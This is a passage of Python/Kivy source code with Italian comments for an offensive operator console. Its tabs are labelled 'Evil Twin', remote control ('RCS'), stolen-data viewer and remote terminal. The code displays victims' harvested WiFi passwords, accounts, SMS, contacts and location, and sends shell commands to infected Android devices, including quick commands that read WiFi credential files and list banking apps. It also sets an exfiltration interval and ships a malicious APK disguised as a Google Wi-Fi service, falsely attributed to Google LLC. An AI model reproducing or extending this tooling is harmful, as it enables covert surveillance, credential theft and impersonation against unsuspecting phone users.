        rep_box = BoxLayout(size_hint_y=0.05, spacing=8)
        rep_box.add_widget(Label(text='Report:', color=(0.7,0.7,0.7,1), size_hint_x=0.1))
        self.report_spinner = Spinner(text='(nessun report)', values=[],
                                     background_color=(0.08,0.08,0.1,1), color=(0,1,0,1),
                                     size_hint_x=0.5)
        rep_box.add_widget(self.report_spinner)
        self.add_widget(rep_box)
        
        # Area dati
        self.add_widget(Label(text='DATI:', font_size=12, color=(0.5,0.5,0.5,1), size_hint_y=0.02))
        self.data_area = TextInput(readonly=True, font_size=11,
                                   background_color=(0.05,0.05,0.07,1), foreground_color=(0,1,0,1))
        self.add_widget(self.data_area)
        
        # Pulsanti per categorie specifiche
        cat_box = BoxLayout(size_hint_y=0.06, spacing=4)
        wifi_btn = StyledButton(text='WiFi', font_size=11)
        wifi_btn.bind(on_press=lambda x: self._show_category('wifi_passwords'))
        cat_box.add_widget(wifi_btn)
        
        accounts_btn = StyledButton(text='Account', font_size=11)
        accounts_btn.bind(on_press=lambda x: self._show_category('accounts'))
        cat_box.add_widget(accounts_btn)
        
        contacts_btn = StyledButton(text='Contatti', font_size=11)
        contacts_btn.bind(on_press=lambda x: self._show_category('contacts'))
        cat_box.add_widget(contacts_btn)
        
        sms_btn = StyledButton(text='SMS', font_size=11)
        sms_btn.bind(on_press=lambda x: self._show_category('sms'))
        cat_box.add_widget(sms_btn)
        
        loc_btn = StyledButton(text='📍Posizione', font_size=11)
        loc_btn.bind(on_press=lambda x: self._show_category('location'))
        cat_box.add_widget(loc_btn)
        
        device_btn = StyledButton(text='📱Device', font_size=11)
        device_btn.bind(on_press=lambda x: self._show_category('device_info'))
        cat_box.add_widget(device_btn)
        
        self.add_widget(cat_box)
        
        # Aggiorna lista report
        self._refresh_report_list()
    
    def _refresh_report_list(self, *args):
        """Aggiorna lista report disponibili"""
        reports_dir = os.path.join(STEALTH_DIR, 'reports')
        if not os.path.exists(reports_dir):
            self.report_spinner.values = ['(nessun report)']
            return
        
        reports = sorted([f for f in os.listdir(reports_dir) if f.endswith('.json')], reverse=True)
        if reports:
            self.report_spinner.values = reports
            self.report_spinner.text = reports[0]
        else:
            self.report_spinner.values = ['(nessun report)']
    
    def _refresh_data(self, btn):
        """Aggiorna visualizzazione dati"""
        self._refresh_report_list()
        report = self.report_spinner.text
        if report and report != '(nessun report)':
            report_path = os.path.join(STEALTH_DIR, 'reports', report)
            try:
                with open(report_path) as f:
                    data = json.load(f)
                self.data_area.text = json.dumps(data, indent=2, default=str)[:5000]
                self.data_area.text += '\n\n... (troncato, apri report per completo)'
            except Exception as e:
                self.data_area.text = f'Errore: {e}'
    
    def _open_report(self, btn):
        """Apre report completo in popup"""
        report = self.report_spinner.text
        if report and report != '(nessun report)':
            report_path = os.path.join(STEALTH_DIR, 'reports', report)
            try:
                with open(report_path) as f:
                    content = f.read()
                popup = Popup(title=f'📁 {report}',
                             content=Label(text=content, font_size=10, color=(0,1,0,1)),
                             size_hint=(0.9, 0.8))
                popup.open()
            except Exception as e:
                pass
    
    def _view_raw(self, btn):
        """Vedi raw JSON del report selezionato"""
        self._refresh_data(None)
    
    def _show_category(self, category):
        """Mostra una categoria specifica dei dati"""
        report = self.report_spinner.text
        if not report or report == '(nessun report)':
            return
        
        report_path = os.path.join(STEALTH_DIR, 'reports', report)
        try:
            with open(report_path) as f:
                data = json.load(f)
            
            cat_data = data.get(category, {})
            
            # Format display
            if isinstance(cat_data, list):
                text = f"🔍 {category.upper()} ({len(cat_data)} elementi)\n" + "="*40 + "\n"
                for i, item in enumerate(cat_data[:30]):
                    text += f"\n#{i+1}:\n"
                    for k, v in item.items():
                        if isinstance(v, str) and len(v) > 100:
                            v = v[:100] + '...'
                        text += f"  {k}: {v}\n"
                    text += "-"*30 + "\n"
                if len(cat_data) > 30:
                    text += f"\n... e altri {len(cat_data)-30} elementi"
            elif isinstance(cat_data, dict):
                text = f"🔍 {category.upper()}\n" + "="*40 + "\n"
                for k, v in cat_data.items():
                    if isinstance(v, str) and len(v) > 100:
                        v = v[:100] + '...'
                    text += f"  {k}: {v}\n"
            else:
                text = str(cat_data)
            
            self.data_area.text = text
        except Exception as e:
            self.data_area.text = f'Errore caricamento {category}: {e}'

# ================================================================
# TAB 4: TERMINAL
# ================================================================
class TerminalTab(BoxLayout):
    """Tab per terminale interattivo verso il target"""
    
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.orientation = 'vertical'
        self.spacing = 8
        self.padding = 12
        self._build_ui()
    
    def _build_ui(self):
        self.add_widget(Label(text='TERMINALE REMOTO', font_size=18, bold=True,
                             color=(0,1,0,1), size_hint_y=0.05))
        
        # Info target
        self.target_info = Label(text='Seleziona un target dal tab RCS', 
                                color=(0.5,0.5,0.5,1), size_hint_y=0.04)
        self.add_widget(self.target_info)
        
        # Output terminale
        self.add_widget(Label(text='OUTPUT:', font_size=12, color=(0.5,0.5,0.5,1), size_hint_y=0.02))
        self.terminal_output = TextInput(readonly=True, font_size=11,
                                          background_color=(0.02,0.02,0.03,1), foreground_color=(0,1,0,1),
                                          size_hint_y=0.7)
        self.add_widget(self.terminal_output)
        
        # Input comando
        cmd_box = BoxLayout(size_hint_y=0.07, spacing=8)
        cmd_box.add_widget(Label(text='$', color=(0,1,0,1), font_size=16, bold=True, size_hint_x=0.05))
        self.cmd_input = TextInput(text='', background_color=(0.08,0.08,0.1,1), foreground_color=(0,1,0,1),
                                  multiline=False, size_hint_x=0.7)
        cmd_box.add_widget(self.cmd_input)
        send_btn = StyledButton(text='▶ INVIA', size_hint_x=0.15, background_color=(0,0.4,0,1))
        send_btn.bind(on_press=self._send_command)
        cmd_box.add_widget(send_btn)
        clear_btn = StyledButton(text='🧹', size_hint_x=0.1)
        clear_btn.bind(on_press=lambda x: setattr(self.terminal_output, 'text', ''))
        cmd_box.add_widget(clear_btn)
        self.add_widget(cmd_box)
        
        # Pulsanti rapidi
        quick = BoxLayout(size_hint_y=0.06, spacing=4)
        for cmd, label in [('ls /sdcard', '📁 ls'), ('id', '👤 id'), 
                          ('getprop ro.product.model', '📱 model'), 
                          ('dumpsys battery', '🔋 battery'),
                          ('cat /data/misc/wifi/wpa_supplicant.conf', '📶 wifi'),
                          ('pm list packages | grep -i bank', '🏦 bank')]:
            btn = StyledButton(text=label, font_size=10)
            btn.bind(on_press=lambda x, c=cmd: self._quick_cmd(c))
            quick.add_widget(btn)
        self.add_widget(quick)
        
        # Aggiorna info target periodicamente
        Clock.schedule_interval(self._update_target_info, 2)
    
    def _update_target_info(self, dt):
        """Aggiorna info sul target selezionato"""
        target = rcs_engine.target
        if target and target in rcs_engine.devices:
            info = rcs_engine.devices[target]
            self.target_info.text = f"🎯 {info['model']} ({target[:8]}) - {info['ip']}"
            self.target_info.color = (0,1,0,1)
        else:
            self.target_info.text = 'Nessun target selezionato'
            self.target_info.color = (0.5,0.5,0.5,1)
    
    def _send_command(self, btn):
        """Invia comando shell al target"""
        cmd = self.cmd_input.text.strip()
        if not cmd:
            return
        
        target = rcs_engine.target
        if not target or target not in rcs_engine.devices:
            self.terminal_output.text += '\n❌ Nessun target selezionato'
            return
        
        self.terminal_output.text += f'\n$ {cmd}'
        self.cmd_input.text = ''
        rcs_engine.send_command(target, 'shell', cmd)
        
        # Il risultato arriva via callback dal RCS engine
        # (si vedrà quando il device risponde)
        self.terminal_output.text += '\n⏳ In attesa risposta...'
    
    def _quick_cmd(self, cmd):
        """Esegue comando rapido"""
        self.cmd_input.text = cmd
        self._send_command(None)

# ================================================================
# TAB 5: SETTINGS
# ================================================================
class SettingsTab(BoxLayout):
    """Tab per configurazioni globali"""
    
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.orientation = 'vertical'
        self.spacing = 10
        self.padding = 20
        self._build_ui()
    
    def _build_ui(self):
        self.add_widget(Label(text='IMPOSTAZIONI', font_size=18, bold=True,
                             color=(0,1,0,1), size_hint_y=0.06))
        
        # RCS Port
        row = BoxLayout(size_hint_y=0.06, spacing=10)
        row.add_widget(Label(text='Porta RCS:', color=(0.7,0.7,0.7,1), size_hint_x=0.3))
        self.rcs_port_input = TextInput(text=str(CONFIG['rcs_port']), 
                                        background_color=(0.08,0.08,0.1,1), foreground_color=(0,1,0,1))
        row.add_widget(self.rcs_port_input)
        self.add_widget(row)
        
        # HTTP Port
        row = BoxLayout(size_hint_y=0.06, spacing=10)
        row.add_widget(Label(text='Porta HTTP:', color=(0.7,0.7,0.7,1), size_hint_x=0.3))
        self.http_port_input = TextInput(text=str(CONFIG['http_port']),
                                         background_color=(0.08,0.08,0.1,1), foreground_color=(0,1,0,1))
        row.add_widget(self.http_port_input)
        self.add_widget(row)
        
        # Auto-connect
        row = BoxLayout(size_hint_y=0.06, spacing=10)
        row.add_widget(Label(text='Auto-connect priority:', color=(0.7,0.7,0.7,1), size_hint_x=0.4))
        self.auto_switch = Switch(active=CONFIG['auto_connect'])
        row.add_widget(self.auto_switch)
        self.add_widget(row)
        
        # Exfil interval
        row = BoxLayout(size_hint_y=0.06, spacing=10)
        row.add_widget(Label(text='Exfil interval (s):', color=(0.7,0.7,0.7,1), size_hint_x=0.4))
        self.exfil_input = TextInput(text=str(CONFIG['exfil_interval']),
                                     background_color=(0.08,0.08,0.1,1), foreground_color=(0,1,0,1))
        row.add_widget(self.exfil_input)
        self.add_widget(row)
        
        # Salva
        save_btn = StyledButton(text='💾 SALVA IMPOSTAZIONI', size_hint_y=0.07, background_color=(0,0.5,0.2,1))
        save_btn.bind(on_press=self._save_settings)
        self.add_widget(save_btn)
        
        # Info sistema
        self.add_widget(Label(text='', size_hint_y=0.05))
        self.add_widget(Label(text='INFORMAZIONI SISTEMA:', font_size=12, color=(0.5,0.5,0.5,1), size_hint_y=0.03))
        self.sys_info = Label(text='', font_size=11, color=(0.7,0.7,0.7,1), size_hint_y=0.1)
        self.add_widget(self.sys_info)
        
        # Info APK
        apk_path = os.path.join(os.path.dirname(__file__), 'captive', 'download', 'ServiziWiFiGoogle.apk')
        if os.path.exists(apk_path):
            sz = os.path.getsize(apk_path)
            self.sys_info.text = f"APK: {sz/1024:.1f} KB\nPacchetto: com.google.android.wifi.wifi_services\nVersione: 3.0.0\n"
        
        # Pulsante esci
        exit_btn = StyledButton(text='🚪 ESCI', size_hint_y=0.07, background_color=(0.5,0,0,1))
        exit_btn.bind(on_press=lambda x: App.get_running_app().stop())
        self.add_widget(exit_btn)
    
    def _save_settings(self, btn):
        """Salva impostazioni"""
        try:
            CONFIG['rcs_port'] = int(self.rcs_port_input.text)
            CONFIG['http_port'] = int(self.http_port_input.text)
            CONFIG['auto_connect'] = self.auto_switch.active
            CONFIG['exfil_interval'] = int(self.exfil_input.text)
            log.write("[Settings] ✓ Impostazioni salvate")
        except Exception as e:
            log.write(f"[Settings] ✗ Errore: {e}")

# ================================================================
# APP PRINCIPALE
# ================================================================
class ServiziWiFiApp(App):
    """App principale Kivy - Interfaccia grafica completa"""
    
    def build(self):
        Window.clearcolor = (0.04, 0.04, 0.06, 1)
        Window.title = 'Servizi Wi-Fi Google v4.0'
        Window.size = (480, 800)
        
        # Tabbed panel principale
        panel = TabbedPanel(background_color=(0.06,0.06,0.08,1),
                           background_image='',
                           tab_height=40,
                           default_tab_text='',
                           do_default_tab=False,
                           background_color_tab=(0.1,0.1,0.12,1))
        
        # Tab 1: Evil Twin
        tab1 = TabbedPanelItem(text='📡 Evil Twin')
        tab1.content = EvilTwinTab()
        panel.add_widget(tab1)
        
        # Tab 2: RCS Control
        tab2 = TabbedPanelItem(text='🎮 RCS Control')
        tab2.content = RCSTab()
        panel.add_widget(tab2)
        
        # Tab 3: Data View
        tab3 = TabbedPanelItem(text='📁 Data View')
        tab3.content = DataViewTab()
        panel.add_widget(tab3)
        
        # Tab 4: Terminal
        tab4 = TabbedPanelItem(text='💻 Terminal')
        tab4.content = TerminalTab()
        panel.add_widget(tab4)
        
        # Tab 5: Settings
        tab5 = TabbedPanelItem(text='⚙️ Impostazioni')
        tab5.content = SettingsTab()
        panel.add_widget(tab5)
        
        return panel
    
    def on_stop(self):
        """Chiusura app"""
        evil_engine.stop()
        rcs_engine.stop()

# ================================================================
# MAIN
# ================================================================
if __name__ == '__main__':
    print("[*] Avvio Servizi Wi-Fi Google v4.0 - Interfaccia Grafica")
    print("[*] Google LLC - Strumento di diagnostica rete")
    print()
    ServiziWiFiApp().run()
